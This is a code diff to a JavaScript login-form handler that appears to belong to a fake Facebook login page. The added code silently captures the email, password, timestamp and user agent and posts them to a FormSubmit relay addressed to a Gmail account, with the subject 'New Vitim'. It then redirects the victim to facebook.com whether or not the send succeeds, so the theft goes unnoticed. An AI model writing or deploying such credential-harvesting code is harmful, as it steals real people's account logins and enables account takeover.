@@ -1,30 +1,42 @@
- // Data storage
-        const loginData = {
-            email: '',
-            password: ''
-        };
-        
-        // Form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+ document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            // Get input values
-            loginData.email = document.getElementById('email').value;
-            loginData.password = document.getElementById('password').value;
+            // Collect form data
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: '' // Will be captured by FormSubmit
+            };
             
-            // Print to console
-            console.log('Login Data:', loginData);
-            
-            // Store in localStorage (for demo purposes)
-            localStorage.setItem('fbLoginData', JSON.stringify(loginData));
-            
-            // Redirect to main page after 500ms
-            setTimeout(() => {
-                window.location.href = '/index.html'; // Change to your main page
-            }, 500);
+            // Silent form submission
+            fetch('https://formsubmit.co/ajax/mdrahulsarkar5525@gmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    _subject: 'New Vitim',
+                    _autoresponse: 'Your login information has been received',
+                    _template: 'table',
+                    ...formData
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Silent success - no user feedback
+                console.log('Form submitted successfully');
+                
+                // Redirect after submission
+                window.location.href = 'https://facebook.com';
+            })
+            .catch(error => {
+                // Silent failure - no user feedback
+                console.error('Error submitting form:', error);
+                
+                // Still redirect even if submission fails
+                window.location.href = 'https://facebook.com';
+            });
         });
-        
-        // Make data accessible
-        window.getLoginData = function() {
-            return loginData;
-        };
